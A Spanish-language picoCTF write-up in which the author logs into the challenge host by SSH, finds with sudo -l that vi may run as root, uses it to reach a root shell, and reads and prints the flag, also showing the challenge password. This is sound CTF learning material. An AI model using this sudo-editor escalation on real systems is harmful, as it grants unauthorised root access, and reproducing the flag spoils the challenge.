---
#### Descripcion:
Can you read files in the root file?
Additional details will be available after launching your challenge instance.

###### Informacion adicional:
```
ssh -p 52634 picoplayer@saturn.picoctf.net
Password: j4ks-9nxB-
Can you login and read the root file?
```

#### Pistas: 
```
1.- What permissions do you have?
```

#### Solución:
- **Entramos a un servidor de manera remota por medio de SSH, con la direccion que se nos proporciono despues de comenzar el desafio.**
```
Esraly-picoctf@webshell:~$ ssh -p 52634 picoplayer@saturn.picoctf.net
```
- **Apliqué ls para ver si contenia algo, pero al ver las pistas se observa que necesitamos permisos, para ello usaremos sudo -l para ver que comandos estan disponibles.**
```
picoplayer@challenge:~$ ls
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```
- **Tenemos solamente un comando disponible, lo que quiere decir que ese es el que se usará:**
```
picoplayer@challenge:~$ sudo vi test

[No write since last change]
```
- **Necesitamos una vista detallada de los archivos que estan en root, por lo tanto usaremos ls -la, en primera instancia no aparece el archivo que buscamos, por lo que saldremos de la carpeta e intentaremos de nuevo.**
```
root@challenge:/home/picoplayer# ls -la
total 24
drwxr-xr-x 1 picoplayer picoplayer    37 Feb 21 20:13 .
drwxr-xr-x 1 root       root          24 Aug  4  2023 ..
-rw-r--r-- 1 picoplayer picoplayer   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer  3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer    34 Feb 21 20:09 .cache
-rw-r--r-- 1 picoplayer picoplayer   807 Feb 25  2020 .profile
-rw------- 1 root       root       12288 Feb 21 20:13 .test.swp
root@challenge:/home/picoplayer# cd /root
root@challenge:~# ls -la
total 16
drwx------ 1 root root   22 Feb 21 20:12 .
drwxr-xr-x 1 root root   63 Feb 21 20:08 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  759 Feb 21 20:12 .viminfo
```
- **Se encuentra el archivo flag.txt, usando cat lo leeremos.**
```
root@challenge:~# cat .flag.txt 
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
```

#### Bandera:
- **picoCTF{uS1ng_v1m_3dit0r_021d10ab}**

